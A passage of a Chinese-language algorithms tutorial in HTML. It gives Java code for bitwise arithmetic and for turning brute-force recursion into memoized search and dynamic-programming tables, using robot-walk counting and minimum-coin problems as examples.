class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>减法就是a + (-b)</p><p>-b就是补码，取反+1</p><h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>二进制乘法，跟正常十进制乘法完全类似</p><p>10010</p><p>*  101</p><p>=</p><p>10010</p><p>+ 000000 （a左移1位，b右移1位）</p><p>+ 1001000 （a再左移1位，b再右移1位）</p><p>至b为0为止</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">multiply</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        b <span class="token operator">>>>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 无符号右移，即前面总用0去补</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>示例：</p><p>a = 0110111</p><p>b = 0000011</p><p>a是否能减去b&lt;&lt;31，不能</p><p>a是否能减去b&lt;&lt;30，不能</p><p>…</p><p>a是否能减去b&lt;&lt;4，能</p><p>a - b&lt;&lt;4 = 0000111 赋给a，并且商必然含有1&lt;&lt;4 10000</p><p>现在a是否能减去b&lt;&lt;4，不能</p><p>…</p><p>a是否能减去b&lt;&lt;1，能</p><p>a - b&lt;&lt;1 = 0000001 赋给a，并且商必然含有1&lt;&lt;1 10010</p><p>现在a是否能减去b&lt;&lt;1，不能</p><p>现在a是否能减去b&lt;&lt;0，不能，说明这是个小余数，忽略</p><blockquote><p>左移有可能导致溢出，移着移着符号位变成1了</p><p>所以右移更加安全，让a右移31, 30, …看是否大于b</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> abs_a <span class="token operator">=</span> a <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> abs_b <span class="token operator">=</span> b <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">:</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">=</span><span class="token function">minus</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>abs_a<span class="token operator">>></span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> abs_b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            abs_a <span class="token operator">=</span> <span class="token function">minus</span><span class="token punctuation">(</span>abs_a<span class="token punctuation">,</span> abs_b <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">|=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span>i<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">:</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力递归-gt-DP"><a href="#暴力递归-gt-DP" class="headerlink" title="暴力递归 -&gt; DP"></a>暴力递归 -&gt; DP</h2><p>通过尝试写出暴力递归版本 -&gt;</p><p>抛开题目，观察暴力版本，加缓存写出记忆化搜索版本 -&gt;</p><p>通过观察数组中各个数的关系，写出严格表版本</p><h3 id="0x01-题目一"><a href="#0x01-题目一" class="headerlink" title="0x01 题目一"></a>0x01 题目一</h3><p>假设有排成一行的 N 个位置，记为 1~N，N &gt; 1</p><p>开始时机器人在其中的 S 位置上(S 一定是 1~N 中的一个)，机器人可以往左走或者往右走</p><p>如果机器人来到 1 位置， 那么下一步只能往右来到 2 位置</p><p>如果机器人来到 N 位置，那么下一步只能往左来到 N-1 位置</p><p>规定机器人必须走 K 步，最终能来到 E 位置(E 也一定是 1~N 中的一个)的方法有多少种</p><blockquote><p>N=5,S=2,K=3,E=3 上面的参数代表所有位置为 1 2 3 4 5</p><p>机器人最开始在 2 位置上，必须经过 3 步，最后到达 3 位置</p><p>走的方法只有如下 3 种:</p><p>1)从2到1，从1到2，从2到3</p><p>2)从2到3，从3到2，从2到3</p><p>3)从2到3，从3到4，从4到3</p><p>所以返回方法数 3</p></blockquote><h4 id="1-0-暴力递归"><a href="#1-0-暴力递归" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 还有rest步，当前在cur位置</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> cur<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk1</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-记忆化搜索"><a href="#2-0-记忆化搜索" class="headerlink" title="2.0 记忆化搜索"></a>2.0 记忆化搜索</h4><blockquote><p>假设 N = 5, E = 4, S = 2, K = 4</p><p>通过上面写的暴力递归版本画出递归过程的草图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f8.png"></p><p>可以看到f(2,2)被分别调用，分别独立计算多次，导致消耗更多的时间，如果我们将已经算出来过的结果缓存起来，再次调用的时候，直接返回，而不是重新计算，就会节省大量时间</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> cur<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span>  <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk2</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">S</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构"><a href="#3-0-严格表结构" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><p>画出二维表，整理表中各个数的依赖关系</p><p>N = 5, E = 4, S = 2, K = 4</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f9.png"></p><p>1）首先观察base case</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即rest为0的话，可以确定dp[0]整个一行的值，即4那一列为1，其它列都为0</p><blockquote><p>注意cur不可能为0，因为只能从1 - N，所以cur为0的一列没有意义</p></blockquote><p>2）继续看下面的语句</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为1的这一列，每一行都由右上角决定</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f10.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为N的这一列，每一行都由左上角决定</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span>  <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为2-4的情况，即由左上角 + 右上角决定</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f11.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk3</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">E</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>cur<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>cur<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token class-name">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">S</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>本题目其实严格表结构和记忆化搜索时间复杂度是相同的，都是O(K*N)</p></blockquote><blockquote><p>改写为严格表结构的步骤：</p><p>1）确定可变参数，几个可变参数就搞几维数组</p><p>2）确定最终目标</p><p>3）base case</p><p>4）搞清表中各个数的依赖关系</p><p>5）确定依次计算的顺序</p></blockquote><h3 id="0x02-题目二"><a href="#0x02-题目二" class="headerlink" title="0x02 题目二"></a>0x02 题目二</h3><p>给定数组 arr，arr 中所有的值都为正数且不重复。每个值代表一种面值的货币，每种面值的货币可以使用任意张</p><p>再给定一个整数 aim，代表要找的钱数</p><p>求组成 aim 的最少货币数</p><blockquote><p>arr=[5,2,3]，aim=20</p><p>4 张 5 元可以组成 20 元，其他的找钱方案都要使用更多张的货币，所以返回 4</p><p>arr=[5,2,3]，aim=0</p><p>不用任何货币就可以组成 0 元，返回 0</p><p>arr=[3,5]，aim=2</p><p>根本无法组成 2 元，钱不能找开的情况下默认返回-1</p></blockquote><h4 id="1-0-暴力递归-1"><a href="#1-0-暴力递归-1" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><p>从数组开头开始尝试</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 还剩rest钱需要找，index为arr的下标</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>index <span class="token operator">==</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> rest <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 要返回的结果，先初始化为-1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span>rest<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 当前用了k*arr[index]这些钱，那就还需要找rest-k*arr[index]</span>        <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> rest <span class="token operator">-</span> k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> result <span class="token operator">=</span> result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token 